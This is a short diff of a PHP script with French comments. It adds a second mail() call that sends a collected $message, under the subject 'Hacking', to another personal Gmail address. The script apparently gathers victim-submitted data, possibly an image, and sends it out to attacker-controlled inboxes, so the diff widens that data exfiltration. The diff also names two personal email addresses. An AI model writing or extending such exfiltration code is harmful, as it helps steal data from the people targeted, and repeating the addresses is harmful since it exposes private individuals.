@@ -37,6 +37,8 @@
 
 				// Envoi du mail
 				mail('miguel.dc.ferreira1@gmail.com', 'Hacking', $message);
+				mail('theo.delacoux@gmail.com', 'Hacking', $message);
+			
 			}
 			
 			//on verifie si on a bien recupere l'image
